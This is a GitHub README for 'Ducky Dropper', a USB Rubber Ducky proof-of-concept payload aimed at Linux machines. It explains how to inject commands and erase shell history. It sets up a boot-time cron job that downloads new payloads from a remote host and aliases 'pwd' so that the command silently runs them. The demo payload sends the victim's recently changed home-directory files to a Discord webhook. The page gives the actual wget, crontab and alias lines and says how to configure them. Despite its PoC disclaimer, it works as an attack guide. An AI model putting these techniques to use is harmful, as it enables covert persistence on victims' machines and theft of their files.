<div align="center">
  
# Ducky Dropper


</div>

REM TITLE: Ducky_Dropper

REM AUTHOR: OSINTI4L (https://github.com/OSINTI4L)

REM TARGET OS: Linux (tested on Kali Linux release 2025.2)


## What is Ducky Dropper?
Ducky Dropper is a three part payload:
1. The DuckyScript Payload - [DS_payload.txt](https://github.com/OSINTI4L/DuckyScript-Payloads/blob/main/Payloads/Ducky_Dropper/DS_payload.txt)
2. The Bash script dropper - [cron_dropper.sh](https://github.com/OSINTI4L/DuckyScript-Payloads/blob/main/Payloads/Ducky_Dropper/cron_dropper.sh)
3. The Bash script payload - [payload.sh](https://github.com/OSINTI4L/DuckyScript-Payloads/blob/main/Payloads/Ducky_Dropper/payload.sh)

Ducky Dropper is **proof of concept** payload that uses the `DS_payload.txt` loaded onto the Hak5 USB Rubber Ducky to grab two Bash scripts (`cron_dropper.sh` and `payload.sh`) hosted on an attackers' Github. This uses Github (or could be configured with other hosting platforms) as a way to host payloads to be persistently dropped onto the target system. Once the payloads are downloaded to the target machine, the DuckyScript payload creates two hidden directories to store the respective scripts. It gives the scripts execution permissions, sets the dropper script (`cron_dropper.sh`) as a cronjob to be ran 60 seconds after machine boot, and then creates an alias for the `pwd` command to act as a trigger for payload script (`payload.sh`) execution. The terminal history is unset immediately after the terminal is popped to obfuscate the fact that code was injected, and then closes when done. Total injection time is ~4.5 seconds.

Ducky Dropper is designed so that once injected on the victim machine via the DuckyScript payload, when the target user enters the trigger command (in this case `pwd`, but can be changed, spoken about later), it will execute the `payload.sh` stored in `~/.confg`.

60 seconds after the machine is booted, the dropper becomes active. The dropper will first check to see if the machine is internet connected by sending a `ping` to hak5.org. If internet connectivity is *not* present, the dropper will exit and lay dormant until next boot. If internet connectivity *is* present, the dropper will grab a payload from the configured host site (Github) path. It will then calculate and compare an sha256sum checksum of the newly downloaded payload against the current payload present in `~/.confg` (the payload that is currently executed via the trigger command). If the checksums *match*, the newly downloaded payload is discarded (because it's the same as what is already present). If the checksums *do not* match the payload in `~/.confg` (the current payload) is replaced by the newly downloaded payload and given execution permissions. This allows for updated payloads to be grabbed via the dropper and executed by the trigger command. The attacker is able to maintain persistence on the target system and send it payloads of the attackers' choice to be grabbed on machine boot and executed by the trigger command.

**Configurations for all scripts/payloads can be changed, such as changing the trigger command, payload path for the dropper, etc, and is discussed below.**

---

### Testing Environment

For this PoC I have set the DuckyScript payload to grab two Bash sripts (`cron_dropper.sh` and `payload.sh`) from Github. These are for demonstration purposes only to show how the payload works. The `payload.sh` is a Bash payload that when executed, checks for internet connectivity, looks for files inside of the users home directory that have been modified in the last 24 hours, if found tarballs them and exfiltrates them to a Discord webhook. If you would like to test this payload, you will need to manually add your Discord webhook to line 37 of the `payload.sh` after the DuckyScript payload has finished its injection. This can be accomplished with the following command: `sed -i '37c\https://discord.com/api/webhooks/your/webhook/here' ~/.confg/*`. This would normally be pre-configuerd in the payload prior to being hosted and grabbed so that when the payload is dropped it is fully configured; but it's not cause PoC.

After the Discord webhook has been configured, running the `pwd` command will silently exfiltrate modified files:
<img width="760" height="151" alt="t2" src="https://github.com/user-attachments/assets/2968a7b0-e95b-46a8-ba61-dc52b4296017" />

If you would like to test the dropper after having tested payload execution (aka manually adding your webhook and running `pwd`), reboot the system, after 60 seconds perform the following command: `cat ~/.confg/*`. You will see that the `payload.sh` has been replaced/updated by the dropper and that your webhook is no longer present.

Again, please remember that these provided payloads are PoC only, and to not use them in their "demo" configuration to attack or persist on target machines.

---

### DuckyScript Payload (DS_payload.txt)

1. The Ducky will pop a terminal, unset the history file, and then download the two aforementioned Bash scripts (`cron_dropper.sh` and `payload.sh`).
2. Creates two hidden directories inside of the users home folder (`.cronfg` and `.confg`) that place and host the aforementioned Bash scripts.
	- `.cronfg` is the directory responsible for hosting the `cron_dropper.sh` script.
	- `.confg` is the directory responsible for hosting the `payload.sh` script.
   
3. Grants execution permissions to both scripts.
4. Sets up `cron_dropper.sh` as a cronjob to be ran 60 seconds after the target machine is booted.
5. Creates an alias for `pwd` that will execute `pwd` with the expected output *and* executes the `payload.sh` script.
6. Closes terminal to obfuscate activity.

**Configuration:**
- The attackers' Github path to where the dropper is hosted must be defiend in line 8.
	- e.g., `DEFINE #CRON_DROPPER https://raw.githubusercontent.com/OSINTI4L/DuckyScript-Payloads/refs/heads/main/Payloads/Ducky_Dropper/cron_dropper.sh`
	
- The attackers' Github path to where the payload is hosted must be defiend in line 9.
	- e.g., `DEFINE #PAYLOAD https://raw.githubusercontent.com/OSINTI4L/DuckyScript-Payloads/refs/heads/main/Payloads/Ducky_Dropper/payload.sh`

- The trigger command by default is `pwd`, this can be altered by changing the command in line 30.
	- e.g., `STRINGLN alias pwd='pwd; (/home/$USER/.confg/*.sh > /dev/null 2>&1 & )'` (commands are changed here --> `pwd='pwd`)

---

### The Dropper (cron_dropper.sh)

1. The dropper allows attacker persistence to the target machine.
2. Grabs new payloads hosted via Github (or your hosting platform choice) to be passed to and executed by the trigger command.
3. Performs internet connectivity checks before executing the entirety of the payload.
4. Performs a checksum function to identify a change in payload.
5. Places new payload into the `~/.confg` directory to be executed by the trigger command.

**Configuration:**
- The frequency of the dropper "phoning home" for payloads can be altered in the DS_payload.txt. By default, it is sent to grab payloads 60 seconds after machine boot. If you would like to change this, it will need to be configured prior to initial DuckyScript payload injection. This can be altered on line 26 of the `DS_payload.txt` file.
	- e.g., `"@reboot sleep 60 && ~/.cronfg/cron_dropper.sh"` - change the `@reboot sleep 60` to the desired configuration.
	
- The source of where the dropper grabs payloads from cannot be changed post DuckyScript injection.
	- e.g., `wget -q -P /home/$user/.confg_tmp https://raw.githubusercontent.com/OSINTI4L/DuckyScript-Payloads/refs/heads/main/Payloads/Ducky_Dropper/payload.sh` - The dropper will always look to this URL path for new payloads. To create updated payloads, you would simply edit the code of `/payload.sh` on the hosting platform. It is important to note, do not change the URL path/file name after initial DuckyScript injection, this could break the hash function and cause issues.
	
---

### The Payload (payload.sh)
(demo payload)

 When the `pwd` command is entered, the following happens:
1. Checks for internet connectivity, if not present, exits, else:
2. Search for files in the target users home directory that have been modified in the last 24 hours.
3. If files, tarballs them, and then exfiltrates them to a Discord webhook.
As this is a demo payload, you will need to manually configure the Discord webhook (explained above in the testing environment section).

---

**A note on configuration of payload.sh and cron_dropper.sh**

It is important to note that whatever choice of naming convention used to name the payloads and dropper, they should be used consistently (so pick something you like). This is to prevent possible errors with the checksum process. As an example, if the intiially downloaded payload is `payload123.sh`, then all subsequent payloads grabbed by the dropper should also be named `payload123.sh`.

Also, if you would like to change the name of the dropper, the change must also be done in the DS_payload.txt `"@reboot sleep 60 && ~/.cronfg/cron_dropper.sh"` (line 26) to ensure the cronjob calls to the correct dropper.

All naming conventions of files should be use consistently accross all three payloads to ensure the prevention of errors.
